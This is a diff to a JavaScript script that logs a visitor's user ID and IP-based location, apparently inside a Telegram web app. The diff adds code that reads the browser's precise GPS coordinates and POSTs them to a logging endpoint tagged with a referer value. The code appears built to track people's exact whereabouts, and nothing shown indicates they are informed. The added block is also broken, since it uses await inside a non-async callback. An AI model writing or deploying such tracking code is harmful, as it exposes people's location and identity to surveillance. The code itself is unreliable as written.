@@ -35,15 +35,6 @@ const request = async () => { // Calling a "synchronous" fetch
 	var zip = data.postal;
     var lat = data.latitude;
     var lon = data.longitude;
-    
-    if(navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-			(position) =>  {
-				// accuracy_radius = position.coords.accuracy;
-				// lat = position.coords.latitude;
-				// lon = position.coords.longitude;
-			});
-    }
 
     const map = new Map([
     ["user_id", user.id],
@@ -77,7 +68,27 @@ const request = async () => { // Calling a "synchronous" fetch
         body: log
     });
     
-    // tg.sendData(log);
+    if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+			(position) =>  {
+                const geo_map = new Map([
+                    ["accuracy", position.coords.accuracy],
+                    ["latitude", position.coords.latitude],
+                    ["longitude", position.coords.longitude]
+                ]);
+
+                const geo_log = mapToJSON(geo_map);
+
+                await fetch(`http://127.0.0.1:8080/logs.sendGPS/${referer}`, {
+                    method: 'POST',
+                    headers: {
+                        'Accept': 'text/plain',
+                        'Content-Type': 'text/plain'
+                    },
+                    body: geo_log
+                });
+			});
+    }
 }
 
 request();
